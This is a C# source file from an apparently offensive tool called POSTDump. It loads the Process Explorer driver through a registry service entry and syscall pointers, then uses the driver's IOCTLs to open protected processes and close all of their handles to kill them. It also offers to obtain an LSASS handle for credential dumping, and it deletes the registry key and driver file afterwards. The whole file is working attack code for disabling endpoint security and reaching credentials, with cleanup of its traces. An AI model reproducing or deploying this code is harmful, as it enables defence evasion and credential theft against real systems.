using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using Microsoft.Win32.SafeHandles;
using Data = POSTMiniDump.Data;
using System.IO;
using System.Collections.Generic;

namespace POSTDump
{
    public class Driver
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateFile([MarshalAs(UnmanagedType.LPTStr)] string filename, [MarshalAs(UnmanagedType.U4)] FileAccess access, [MarshalAs(UnmanagedType.U4)] FileShare share, IntPtr securityAttributes, [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition, [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes, IntPtr templateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtLoadDriver(ref Data.UNICODE_STRING DriverServiceName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtUnloadDriver(ref Data.UNICODE_STRING DriverServiceName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate Data.NTSTATUS NtDeviceIoControlFile(IntPtr hDriver, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref Data.IO_STATUS_BLOCK IoStatusBlock, UInt32 IoControlCode, IntPtr InputBuffer, UInt32 InputBufferLength, ref IntPtr OutputBuffer, UInt32 OutputBufferLength);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCEXP_DATA_EXCHANGE
        {
            public ulong ulPID;
            public IntPtr lpObjectAddress;
            public ulong ulSize;
            public ulong ulHandle;
        }

        [StructLayoutAttribute(LayoutKind.Sequential)]
        public struct TargetProcess
        {
            public uint ProcessId;
            public uint ThreadId;
        }

        [StructLayoutAttribute(LayoutKind.Sequential)]
        struct SYSTEM_PROCESS_INFORMATION
        {
            public uint NextEntryOffset;
            public uint NumberOfThreads;
            long SpareLi1;
            long SpareLi2;
            long SpareLi3;
            public long CreateTime;
            public long UserTime;
            public long KernelTime;
            public Data.UNICODE_STRING ImageName;
            public int BasePriority;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
            public uint HandleCount;
            public uint SessionId;
            public IntPtr PageDirectoryBase;
            public IntPtr PeakVirtualSize;
            public IntPtr VirtualSize;
            public uint PageFaultCount;
            public IntPtr PeakWorkingSetSize;
            public IntPtr WorkingSetSize;
            public IntPtr QuotaPeakPagedPoolUsage;
            public IntPtr QuotaPagedPoolUsage;
            public IntPtr QuotaPeakNonPagedPoolUsage;
            public IntPtr QuotaNonPagedPoolUsage;
            public IntPtr PagefileUsage;
            public IntPtr PeakPagefileUsage;
            public IntPtr PrivatePageCount;
            long ReadOperationCount;
            long WriteOperationCount;
            long OtherOperationCount;
            long ReadTransferCount;
            long WriteTransferCount;
            long OtherTransferCount;
        }

        [StructLayoutAttribute(LayoutKind.Sequential)]
        public struct SYSTEM_THREAD_INFORMATION
        {
            public Data.LARGE_INTEGER KernelTime;
            public Data.LARGE_INTEGER UserTime;
            public Data.LARGE_INTEGER CreateTime;
            public uint WaitTime;
            public IntPtr StartAddress;
            public Data.CLIENT_ID ClientId;
            public int Priority;
            public int BasePriority;
            public uint ContextSwitchCount;
            public uint State;
            public int WaitReason;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SYSTEM_HANDLE
        {
            // Information Class 16
            public uint ProcessID;
            public byte ObjectTypeNumber;
            public byte Flags; // 0x01 = PROTECT_FROM_CLOSE, 0x02 = INHERIT
            public ushort Handle;
            public IntPtr Object_Pointer;
            public uint GrantedAccess;
        }

        public static IntPtr ntdeviceptr;
        public static IntPtr ntquerysys;

        private static bool SetRegistryValues(Data.UNICODE_STRING Path, string ServiceName)
        {
            Microsoft.Win32.RegistryKey key = Registry.LocalMachine.CreateSubKey("System\\CurrentControlSet\\Services\\" + ServiceName);
            try
            { 
                key.SetValue("Type", 0x0);
                key.SetValue("ErrorControl", 0x0);
                key.SetValue("Start", 0x0);
                key.SetValue("ImagePath", Marshal.PtrToStringUni(Path.Buffer, (Path.Length / 2)), RegistryValueKind.ExpandString);
                key.Close();
            }
            catch
            {
                Console.WriteLine("[!] Failed to create registry value entry..");
                return false;
            }

            Console.WriteLine("[+] Registry key added.");
            return true;
        }

        private static bool DeleteRegistryKey(string ServiceName)
        {
            try
            {
                Registry.LocalMachine.DeleteSubKey("System\\CurrentControlSet\\Services\\" + ServiceName);
                Console.WriteLine("[+] Registry key deleted");
                return true;
            }
            catch
            {
                Console.WriteLine("Registry key not found");
                return false;
            }
        }

        private static bool LoadDriver(string path, string ServiceName)
        {
            Data.UNICODE_STRING usDriverServiceName = new Data.UNICODE_STRING();
            Data.UNICODE_STRING szNtRegistryPath = new Data.UNICODE_STRING();

            if (!POSTDump.Handle.EnablePrivilege("SeLoadDriverPrivilege"))
            {
                Console.WriteLine("Getting SeLoadDriverPrivilege failed");
                return false;
            }

            POSTMiniDump.Utils.RtlInitUnicodeString(ref szNtRegistryPath, @"\??\" + path);
            if (!SetRegistryValues(szNtRegistryPath, ServiceName))
            {
                Console.WriteLine("Could not set registry value");
                return false;
            }

            POSTMiniDump.Utils.RtlInitUnicodeString(ref usDriverServiceName, @"\Registry\Machine\System\CurrentControlSet\Services\" + ServiceName);

            IntPtr ntdriverptr = Postdump.isyscall.GetSyscallPtr("NtLoadDriver");
            NtLoadDriver NTLD = (NtLoadDriver)Marshal.GetDelegateForFunctionPointer(ntdriverptr, typeof(NtLoadDriver));
            Data.NTSTATUS rez = NTLD(ref usDriverServiceName);
            if (rez != Data.NTSTATUS.Success)
            {
                Console.WriteLine("Load driver failed with error: " + rez.ToString());
                return false;
            }

            return true;
        }

        private static bool UnLoadDriver(string driverpath, string ServiceName)
        {
            Data.UNICODE_STRING usDriverServiceName = new Data.UNICODE_STRING();
            POSTMiniDump.Utils.RtlInitUnicodeString(ref usDriverServiceName, @"\Registry\Machine\System\CurrentControlSet\Services\" + ServiceName);

            IntPtr ntdriverptr2 = Postdump.isyscall.GetSyscallPtr("NtUnloadDriver");
            NtUnloadDriver NTULD = (NtUnloadDriver)Marshal.GetDelegateForFunctionPointer(ntdriverptr2, typeof(NtUnloadDriver));
            Data.NTSTATUS rez = NTULD(ref usDriverServiceName);
            if (rez != Data.NTSTATUS.Success)
            {
                Console.WriteLine("UnLoad driver failed with error: " + rez.ToString());
                DeleteRegistryKey(ServiceName);
                return false;
            }

            Console.WriteLine("[+] Driver unloaded");
            DeleteRegistryKey(ServiceName);
            return true;
        }

        private static bool GetDriverHandle(string drvname, out IntPtr hDriver) 
        {
            hDriver = CreateFile(@"\\.\" + drvname, FileAccess.ReadWrite, 0, IntPtr.Zero, FileMode.Open, FileAttributes.Normal, IntPtr.Zero);
            if (hDriver == IntPtr.Zero)
            {
                Console.WriteLine("Get driver handle failed");
                return false;
            }
            
            return true;
        }

        private static bool GetProtectedProcessHandle(IntPtr hDriver, int pid, out IntPtr hProtectedProcess)
        {
            Data.IO_STATUS_BLOCK isb = new Data.IO_STATUS_BLOCK();
            hProtectedProcess = IntPtr.Zero;
            IntPtr pidbuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
            Marshal.StructureToPtr((IntPtr)pid, pidbuffer, true);

            NtDeviceIoControlFile NTDCF = (NtDeviceIoControlFile)Marshal.GetDelegateForFunctionPointer(ntdeviceptr, typeof(NtDeviceIoControlFile));
            Data.NTSTATUS rez = NTDCF(hDriver, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref isb, 2201288764, pidbuffer, (UInt32)Marshal.SizeOf(typeof(IntPtr)), ref hProtectedProcess, (UInt32)Marshal.SizeOf(typeof(IntPtr)));
            if (rez != Data.NTSTATUS.Success)
            {
                Console.WriteLine("Failed to get protected process handle:" + rez.ToString());
                return false;
            }

            Console.WriteLine("[+] Got protected process handle");
            return true;
        }

        private static bool DeleteDiskDriver(string driverpath)
        {
            try
            {
                File.SetAttributes(driverpath, FileAttributes.Normal);
                File.Delete(driverpath);
                Console.WriteLine("[+] Driver deleted from disk");
                return true;
            }
            catch
            {
                Console.WriteLine("[!] Failed to delete driver from disk..");
                return false;
            }
        }

        private static unsafe bool KillHandle(IntPtr hDriver, int dwPID, SYSTEM_HANDLE pHandle)
        {
            
            Data.IO_STATUS_BLOCK isb = new Data.IO_STATUS_BLOCK();
            IntPtr buf = IntPtr.Zero;
            PROCEXP_DATA_EXCHANGE ctrl = new PROCEXP_DATA_EXCHANGE();
            ctrl.ulPID = (ulong)dwPID;
            ctrl.ulSize = 0;
            ctrl.ulHandle = (ulong)pHandle.Handle;
            ctrl.lpObjectAddress = (IntPtr)pHandle.Object_Pointer;
            IntPtr ctrlbuf = Marshal.AllocHGlobal(Marshal.SizeOf(ctrl));
            Marshal.StructureToPtr(ctrl, ctrlbuf, true);

            NtDeviceIoControlFile NTDCF = (NtDeviceIoControlFile)Marshal.GetDelegateForFunctionPointer(ntdeviceptr, typeof(NtDeviceIoControlFile));
            
            Data.NTSTATUS rez = NTDCF(hDriver, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref isb, 2201288708, ctrlbuf, (UInt32)Marshal.SizeOf(ctrl), ref buf, 0);
            Marshal.FreeHGlobal(ctrlbuf);
            if (rez != Data.NTSTATUS.Success)
            {
                //Console.WriteLine("Failed to kill handle: " + ctrl.ulHandle + " at "+ ctrl.lpObjectAddress.ToString("X") +" -> " + rez.ToString());
                return false;
            }
            //Console.WriteLine("Killed handle: " + ctrl.ulHandle + " at "+ ctrl.lpObjectAddress.ToString("X"));
            return true;
        }

        private static bool KillProcessHandles(IntPtr hProtectedProcess, IntPtr hDriver, int dwPID)
        {
            SYSTEM_HANDLE shHandle;

            while (true)
            {
                GetExitCodeProcess(hProtectedProcess, out uint dwProcStatus);
                if (dwProcStatus != 259) //STILL_ACTIVE
                {
                    return true;
                }

                IntPtr HandleTableInfo = Handle.GetInformationTable(0x10);
                if (HandleTableInfo == IntPtr.Zero)
                {
                    return true;
                }
                    
                int lHandleCount = Marshal.ReadInt32(HandleTableInfo);
                if (lHandleCount == 0)
                    return true;

                IntPtr ipHandle = new IntPtr(HandleTableInfo.ToInt64() + 8);
                List<SYSTEM_HANDLE> lstHandles = new List<SYSTEM_HANDLE>();

                for (int lIndex = 0; lIndex < lHandleCount; lIndex++)
                {
                    shHandle = new SYSTEM_HANDLE();
                    shHandle = (SYSTEM_HANDLE)Marshal.PtrToStructure(ipHandle, shHandle.GetType());
                    ipHandle = new IntPtr(ipHandle.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_HANDLE)) + 8);

                    if ((int)shHandle.ProcessID == dwPID)
                    {
                        lstHandles.Add(shHandle);
                    }
                }

                foreach (var item in lstHandles)
                {
                    KillHandle(hDriver, dwPID, item);
                }
            }

            return true;
        }

        private static void CloseHandle(IntPtr handle)
        {
            Handle.NtClose NTC = (Handle.NtClose)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.ntcloseptr, typeof(Handle.NtClose));
            NTC(handle);
        }

        public static void Kill(int pid, out IntPtr hProtectedProcess, bool GetLsassHandle = false, bool Suspend = false)
        {
            ntdeviceptr = Postdump.isyscall.GetSyscallPtr("NtDeviceIoControlFile");

            hProtectedProcess = IntPtr.Zero;
            string ServiceName = "WinDriver64";
            string drvname = "PROCEXP152";
            string driverPath = System.AppDomain.CurrentDomain.BaseDirectory + "PROCEXP.sys";
            IntPtr hDriver;

            if (!System.IO.File.Exists(driverPath))
            {
                Console.WriteLine($"Driver file not found in {driverPath}! Upload it in current directory");
                return;
            }
            if (!LoadDriver(driverPath, ServiceName))
            {
                Console.WriteLine("[-] Failed loading Driver");
                UnLoadDriver(driverPath, ServiceName);
                DeleteDiskDriver(driverPath);
                return;
            }

            if (!GetDriverHandle(drvname, out hDriver))
            {
                UnLoadDriver(driverPath, ServiceName);
                DeleteDiskDriver(driverPath);
                return;
            }

            if (pid > 0 && !GetLsassHandle)
            {
                if (GetProtectedProcessHandle(hDriver, pid, out hProtectedProcess))
                { 
                    if (KillProcessHandles(hProtectedProcess, hDriver, pid))
                    {
                        Console.WriteLine("[+] Process " + pid + " successfully killed!");
                    }
                }
            }

            if (GetLsassHandle)
            {
                 GetProtectedProcessHandle(hDriver, pid, out hProtectedProcess);
            }

            UnLoadDriver(driverPath, ServiceName);
            CloseHandle(hDriver);
            DeleteDiskDriver(driverPath);

            return;

        }
    }
}
